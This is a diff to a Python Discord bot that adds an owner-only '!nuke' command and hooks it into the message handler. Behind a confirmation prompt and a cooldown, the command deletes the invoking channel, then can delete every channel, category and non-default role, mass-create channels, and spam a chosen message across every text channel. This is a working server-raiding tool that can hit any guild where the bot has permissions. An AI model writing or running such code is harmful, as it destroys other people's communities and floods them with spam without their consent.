@@ -3,9 +3,9 @@ import asyncio
 import os
 import sys
 import json
-import datetime
 import platform
 from collections import defaultdict
+from datetime import datetime, timedelta
 import time
 import embed_command
 import help_command
@@ -285,6 +285,174 @@ async def handle_bc(message, args):
     )
     await message.channel.send(embed=embed, delete_after=5)
 
+
+# nuke command handler
+nuke_cooldown = {}  # guild.id -> datetime of last nuke
+
+async def handle_nuke_command(message, bot):
+    YOUR_USER_ID = 123456789012345678  # Replace with your actual user ID
+    guild = message.guild
+
+    # Cooldown check
+    if guild.id in nuke_cooldown and datetime.utcnow() < nuke_cooldown[guild.id] + timedelta(minutes=10):
+        cooldown_embed = discord.Embed(
+            title="Cooldown Active",
+            description="You must wait before nuking again.",
+            color=discord.Color.dark_orange()
+        )
+        await message.channel.send(embed=cooldown_embed)
+        return
+
+    # Owner check
+    if message.author.id != YOUR_USER_ID:
+        await message.channel.send(embed=discord.Embed(
+            title="Access Denied",
+            description="Only the bot owner can use this command.",
+            color=discord.Color.red()
+        ))
+        return
+
+    def check(m):
+        return m.author == message.author and m.channel == message.channel
+
+    # Confirmation prompt
+    confirm_embed = discord.Embed(
+        title="⚠️ Nuke Confirmation",
+        description="Do you want to proceed with the nuke?\nType `yes` or `no`.",
+        color=discord.Color.red()
+    )
+    await message.channel.send(embed=confirm_embed)
+
+    try:
+        reply = await bot.wait_for("message", timeout=30.0, check=check)
+        if reply.content.lower() != "yes":
+            cancel_embed = discord.Embed(
+                title="❎ Nuke Cancelled",
+                description="You chose not to proceed.",
+                color=discord.Color.dark_red()
+            )
+            await message.channel.send(embed=cancel_embed)
+            return
+    except asyncio.TimeoutError:
+        await message.channel.send(embed=discord.Embed(
+            title="⏳ Timeout",
+            description="No confirmation received. Nuke cancelled.",
+            color=discord.Color.dark_red()
+        ))
+        return
+
+    original_channel = message.channel
+
+    # Destructive animation
+    try:
+        nuke_embed = discord.Embed(
+            title="☢️ Nuking Server...",
+            description="Brace for impact...",
+            color=discord.Color.blurple()
+        )
+        nuke_msg = await original_channel.send(embed=nuke_embed)
+        await asyncio.sleep(1)
+        for frame in ["💣", "💥", "🔥", "☠️", "💀"]:
+            await nuke_msg.edit(embed=discord.Embed(
+                title="☢️ Nuking Server...",
+                description=frame,
+                color=discord.Color.random()
+            ))
+            await asyncio.sleep(1)
+    except:
+        pass
+
+    # Ask what to do
+    question_embed = discord.Embed(
+        title="Nuke Options",
+        description=(
+            "**Choose options to enable (type numbers, comma-separated):**\n"
+            "`1` - Delete all channels & categories\n"
+            "`2` - Delete all roles\n"
+            "`3` - Create new channels\n"
+            "`4` - Spam a message"
+        ),
+        color=discord.Color.orange()
+    )
+    await original_channel.send(embed=question_embed)
+
+    try:
+        option_msg = await bot.wait_for("message", timeout=60.0, check=check)
+        options = option_msg.content.replace(" ", "").split(",")
+    except asyncio.TimeoutError:
+        await original_channel.send("Timed out.")
+        return
+
+    # Delete original channel
+    try:
+        await original_channel.delete()
+    except:
+        pass
+
+    # Delete all channels
+    if "1" in options:
+        for channel in guild.channels:
+            try:
+                await channel.delete()
+            except:
+                pass
+
+    # Delete all roles
+    if "2" in options:
+        for role in guild.roles:
+            if role.is_default():
+                continue
+            try:
+                await role.delete()
+            except:
+                pass
+
+    # Create new channels
+    if "3" in options:
+        try:
+            await message.author.send("How many channels to create?")
+            count_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
+            count = int(count_msg.content)
+
+            await message.author.send("What should be the name of the new channels?")
+            name_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
+            name = name_msg.content
+
+            for _ in range(count):
+                await guild.create_text_channel(name)
+        except:
+            await message.author.send("Failed to create channels or invalid input.")
+
+    # Spam messages
+    if "4" in options:
+        try:
+            await message.author.send("What message should I spam?")
+            spam_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
+            spam_text = spam_msg.content
+
+            await message.author.send("How many times?")
+            spam_count_msg = await bot.wait_for("message", timeout=30.0, check=lambda m: m.author == message.author and isinstance(m.channel, discord.DMChannel))
+            spam_count = int(spam_count_msg.content)
+
+            for channel in guild.text_channels:
+                for _ in range(spam_count):
+                    await channel.send(spam_text)
+        except:
+            await message.author.send("Spamming failed or invalid input.")
+
+    # Update cooldown
+    nuke_cooldown[guild.id] = datetime.utcnow()
+
+    # Final message
+    try:
+        await message.author.send(embed=discord.Embed(
+            title="✅ Nuke Completed",
+            description="All selected actions have been executed.",
+            color=discord.Color.green()
+        ))
+    except:
+        pass
+
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user}")
@@ -365,6 +533,9 @@ async def on_message(message):
 
     await bot.process_commands(message)
     await embed_command.handle_embed_command(message, bot)
+
+    if message.content.startswith("!nuke"):
+        await handle_nuke_command(message, bot)
 
     if message.content.startswith("!merge") and message.author.id == YOUR_USER_ID:
         def check(m):
